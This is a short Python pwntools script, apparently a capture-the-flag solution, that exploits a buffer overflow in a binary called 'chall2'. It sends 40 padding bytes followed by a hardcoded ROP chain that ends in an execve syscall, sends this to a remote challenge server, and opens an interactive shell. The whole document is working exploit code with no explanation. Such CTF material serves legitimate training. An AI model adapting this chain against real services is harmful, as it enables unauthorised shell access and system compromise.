from pwn import *

payload = 'A'*40

elf = ELF('./chall2')


sh = elf.search('sh').next()

rop = p64(0x000000000046b9f8)+p64(0)
rop += p64(0x00000000004016c3)+p64(0)
rop += p64(0x00000000004017d7)+p64(elf.bss())
rop += p64(0x00000000004377d5)+p64(7)
rop += p64(0x0000000000400488)
rop += 'A'*0x600
rop += p64(0)
rop += p64(0)
rop += p64(0)
rop += p64(0x000000000046b9f8)+p64(59)
rop += p64(0x00000000004016c3)+p64(elf.bss())
rop += p64(0x00000000004017d7)+p64(0)
rop += p64(0x00000000004377d5)+p64(0)
rop += p64(0x0000000000400488)
payload+=rop
p = remote('hack.bckdr.in', 15102)
print p.recv()
p.sendline(payload)
p.interactive()
